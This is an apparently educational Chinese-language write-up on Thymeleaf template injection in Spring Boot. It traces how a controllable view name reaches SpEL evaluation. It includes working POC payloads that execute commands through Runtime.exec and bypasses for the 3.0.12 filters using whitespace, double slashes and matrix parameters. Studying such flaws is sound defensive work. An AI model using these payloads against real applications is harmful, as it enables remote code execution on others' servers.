和其他模板注入不太相同，thymeleaf模板注入的漏洞点在模板名可控，插入恶意payload，执行SpEL表达式。

官方文档👉https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html

由文档可知，在SpringMVC下，thymeleaf中的表达式最终会被转化为SpEL表达式。

尝试直接执行恶意的SpEL表达式

```html
<p th:text=${#T(java.lang.Runtime).getRuntime().exec("calc")}></p>
```

会报错

> `org.springframework.expression.spel.SpelEvaluationException: EL1006E: Function 'T' could not be found`

还记得SpEL表达式执行的修复中提到使用`SimpleEvaluationContext`来代替`StandardEvaluationContext`吗？前者旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用。同样thymeleaf也实现了自己的`EvaluationContext` ———— `ThymeleafEvaluationContext`，同样也把这些语法特性阉割了。

虽然但是，模板是否有其他利用点呢？

和其他模板引擎一样，thymeleaf也提供了一些全局上下文变量

> **#ctx** : the context object. An implementation of `org.thymeleaf.context.IContext` or `org.thymeleaf.context.IWebContext` depending on our environment (standalone or web).
>
> `#root`：org.thymeleaf.spring5.expression.SPELContextMapWrapper
>
> `#request` ：(仅在 Web 上下文中)`HttpServletRequest`对象。
>
> `#response` ：(仅在 Web 上下文中)`HttpServletResponse`对象。
>
> `#session` ：(仅在 Web 上下文中)`HttpSession`对象。
>
> `#servletContext` ：(仅在 Web 上下文中)`ServletContext`对象。

```html
<p th:text=${#ctx.springMacroRequestContext.webApplicationContext.getBean("xxx").doSomething()}></p>
```

bean的名字不指定貌似是类名首字母小写

# Reproduce

```xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.0.0.RELEASE</version>
</parent>

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-thymeleaf</artifactId>
</dependency>
```

> `SpringBoot`2.0.0.RELEASE => `thymeleaf-spring5` 3.0.9
>
> `SpringBoot`2.2.0.RELEASE => `thymeleaf-spring5` 3.0.11

```java
@GetMapping("/index")
public String test(@RequestParam String lang){
    return "home/"+lang+"/index";
}
```

POC：

```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc").getInputStream()).next()}__::.x
```

漏洞点在`org.thymeleaf.spring5.view.ThymeleafView#renderFragment`

`renderFragment`用于解析片段

当`viewTemplateName`含有`::`，`viewTemplateName`会被拼接上`~{}`作为片段表达式

> 片段表达式为Thymeleaf 3.x新增的内容
>
> 分段段表达式是⼀种表示标记⽚段并将其移动到模板周围的简单⽅法。
>
> 正是由于这些表达式，⽚段可以被复制，或者作为参数传递给其他模板等等
>
> 在一个文件中定义的fragment（`banner.html`）
>
> ```html
> <div th:fragment="test">Hello</div>
> ```
>
> 可以在其他文件中引用
>
> ```html
> <div th:insert="~{banner::test}"
> ```

![image-20231221210054884](./../.gitbook/assets/image-20231221210054884.png)

进到`StandardExpressionPreprocessor#preprocess`

正则提取`\\_\\_(.*?)\\_\\_`，即提取`__xx__`中间的`xx`内容，封装成一个`expression`并执行`execute`方法，执行了SpEL表达式

![image-20231221210105903](./../.gitbook/assets/image-20231221210105903.png)

此外，下面这种情况也能触发漏洞

```java
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document) {
    //returns void, so view name is taken from URI
}
```

之前提到`DispatcherServlet#doDispatch`会尝试获取`ModelAndView`，视图名就是由`Controller`的返回值得到的，但这里返回为空，造成`DispatcherServlet`获取到的`ModelAndView`也为空

`applyDefaultViewName`会尝试将路径名作为视图名

```java
private void applyDefaultViewName(HttpServletRequest request, @Nullable ModelAndView mv) throws Exception {
    if (mv != null && !mv.hasView()) {
        String defaultViewName = getDefaultViewName(request);
        if (defaultViewName != null) {
            mv.setViewName(defaultViewName);
        }
    }
}

public String getViewName(HttpServletRequest request) {
    String lookupPath = this.urlPathHelper.getLookupPathForRequest(request);
    return (this.prefix + transformPath(lookupPath) + this.suffix);
}

protected String transformPath(String lookupPath) {
    String path = lookupPath;
    if (this.stripLeadingSlash && path.startsWith(SLASH)) {
        path = path.substring(1);
    }
    if (this.stripTrailingSlash && path.endsWith(SLASH)) {
        path = path.substring(0, path.length() - 1);
    }
    if (this.stripExtension) {
        path = StringUtils.stripFilenameExtension(path);
    }
    if (!SLASH.equals(this.separator)) {
        path = StringUtils.replace(path, SLASH, this.separator);
    }
    return path;
}
```

`transformPath`会把请求路径进行如下处理

* 去除开头结尾的SLASH `/` 
* 去除文件扩展名（即去除最后的`.`及后面的内容）

POC：

```java
doc/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::a.b
```

`transformPath`会去掉文件扩展名，因此POC以`a.b`结尾

![image-20231221210120094](./../.gitbook/assets/image-20231221210120094.png)

# ByPass

在`3.0.12`版本，`thymeleaf`增加了一个工具类`SpringStandardExpressionUtils`

`containsSpELInstantiationOrStatic`顾名思义，对实例化和静态方法的调用作了检测

限制了如下：

* 不能有`new`关键字
* `(`左边的字符不能是`T`

可以用空白符绕过：

```java
__${T (java.lang.Runtime).getRuntime().exec("calc")}__::.x
```

此外还有另外一个函数的限制，请求路径不能和返回的视图名一样

```java
// A check must be made that the template name is not included in the URL, so that we make sure
// no code to be executed comes from direct user input.
SpringRequestUtils.checkViewNameNotInRequest(viewTemplateName, request);
```

像下面这种路由就受到了限制

```java
@GetMapping("/home/{page}")
public String getHome(@PathVariable String page) {
    return "home/" + page;
}
```

![image-20231221210137763](./../.gitbook/assets/image-20231221210137763.png)

这里是通过`request.getRequestURI()`获取路径的

两种绕过方式：

* 双写斜杠
  * `home//__%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__%3A%3A.x`
* `;`传递矩阵参数
  * `home;/__%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__%3A%3A.x`

高版本的修复

![image-20231221210147717](./../.gitbook/assets/image-20231221210147717.png)

![image-20231221210152481](./../.gitbook/assets/image-20231221210152481.png)

会往`(`左边一直找`T`

# Ref

* https://github.com/veracode-research/spring-view-manipulation
* https://xz.aliyun.com/t/10514